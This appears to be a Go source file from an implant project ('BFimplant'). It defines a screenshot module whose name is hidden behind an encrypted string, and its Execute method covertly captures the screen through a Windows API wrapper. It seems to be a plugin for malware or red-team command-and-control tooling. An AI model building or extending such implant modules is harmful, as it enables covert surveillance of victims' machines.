package modules

import (
	"BFimplant/winapiV2"
	"fmt"

)

type ScreenshotModule struct{}

func NewScreenshotModule() *ScreenshotModule {
	return &ScreenshotModule{}
}

func (m *ScreenshotModule) Name() string {
	return winapiV2.DecryptString("6&7  +6-*1")
}

func (m *ScreenshotModule) Execute(filename string, data []byte) (string, error) {

	res, errrr := winapiV2.GetScreenshot()
	if errrr != nil {
		return "", fmt.Errorf("failed to get "+winapiV2.DecryptString("6&7  +6-*1")+": %w", errrr)
	}

	return res, nil
}
